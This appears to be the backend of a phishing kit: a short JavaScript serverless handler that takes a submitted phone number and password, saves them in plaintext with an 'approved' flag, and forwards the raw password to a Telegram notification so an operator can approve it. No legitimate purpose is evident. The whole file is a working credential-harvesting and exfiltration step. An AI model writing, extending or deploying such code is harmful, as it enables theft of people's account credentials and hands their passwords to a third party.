import { makeJsonResponse, makeTextResponse, uuidv4, getDataStore, sendTelegramNotification } from "../_shared.js";

export async function onRequest(context) {
  const { request, env } = context;
  if (request.method === "OPTIONS") return makeTextResponse("", 204);
  if (request.method !== "POST") return makeJsonResponse({ error: "Method not allowed" }, 405);

  let body;
  try {
    body = await request.json();
  } catch (error) {
    return makeJsonResponse({ error: "Invalid JSON" }, 400);
  }

  const { phone, password } = body;
  if (!phone || !password) {
    return makeJsonResponse({ error: "Missing fields phone and password" }, 400);
  }

  const requestId = uuidv4();
  const now = new Date().toISOString();
  const store = getDataStore("password");

  const entry = {
    requestId,
    phone,
    password,
    timestamp: now,
    approved: false,
    rejectedReason: null,
  };

  store.set(requestId, entry);

  await sendTelegramNotification(
    { requestId, phone, password, type: "Password Verification" },
    env,
    request.url,
  );

  return makeJsonResponse({ success: true, requestId, message: "Password verification sent for admin approval" });
}
